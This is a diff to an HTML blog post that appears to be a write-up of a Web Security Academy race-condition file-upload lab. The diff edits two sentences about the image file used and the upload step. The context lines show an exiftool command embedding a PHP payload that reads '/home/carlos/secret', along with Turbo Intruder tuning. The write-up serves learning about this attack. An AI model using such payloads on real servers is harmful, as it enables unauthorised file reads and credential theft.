@@ -167,7 +167,7 @@ The vulnerable code that introduces this race condition is as follows:</p>
         <span class="n">table</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
 </code></pre></div></div>
 
-<p>I set concurrentConnections=80 by trial and error, more was hindering the main upload request so I set to 80. Then I downloaded a 500KB PHP file from the web and used exiftool to add this code to it and renamed it to a PHP file:</p>
+<p>I set concurrentConnections=80 by trial and error, more was hindering the main upload request so I set to 80. Then I downloaded a random 500KB PNG file from the web and used exiftool to add this code to it and renamed it to a PHP file:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exiftool -comment="&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;" diamond.php
 </code></pre></div></div>
@@ -202,7 +202,7 @@ The vulnerable code that introduces this race condition is as follows:</p>
 <span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
 </code></pre></div></div>
 
-<p>then I hit upload to send the file, and after about one minute I could get some 200 responses in turbo intruder containing password for carlos! :)</p>
+<p>then I hit upload on the web page in the browser to send the file, and after about one minute I could get some 200 responses in turbo intruder containing password for carlos! :)</p>
 
 <p><br /></p>
 <h4 id="solution-2--web-security-academys-solution">Solution 2:  Web Security Academy’s Solution</h4>
